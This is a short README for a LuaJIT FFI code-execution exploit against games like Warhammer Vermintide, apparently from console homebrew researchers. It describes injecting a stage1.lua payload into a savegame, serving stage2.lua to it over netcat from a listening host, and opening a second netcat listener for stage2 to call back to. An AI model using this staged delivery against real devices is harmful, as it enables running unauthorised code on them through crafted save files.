# LuaFFI Code execution

To be used with titles that support FFI in their LUA engine

f.e.

- Warhammer Vermintide
- Warhammer Vermintide 2

Tools:

- XblContainerReader: <https://github.com/LukeFZ/XblContainerReader>

## How To

- Edit `stage1.lua` with your PC's IP/PORT
- Inject edited `stage1.lua` contents into savegame of your choice
- Edit `stage2.lua` and serve it via netcat(TCP) on the configured IP/Port that was configured in `stage1` 

Example

```
# Note: -w <seconds> will cleanly close the socket after all data (aka. stage2) was sent to the client
cat stage2.lua | nc -w 1 -lvp 8123
```

Also open another socket that stage2 can use

```
nc -lvp 8124
```

- Start the game / have savegame loaded
- Profit

PS: The testWindows variable is very useful to set when you wanna dry-run on windows first!

Windows LuaJIT: https://github.com/luapower/luajit/tree/master/bin/mingw64 (only need exe and dll)

## Credits

- TitleOS
- ihatecompvir
- LukeFZ
- onebawbag
- Shadow LAG
- Team XboxOneResearch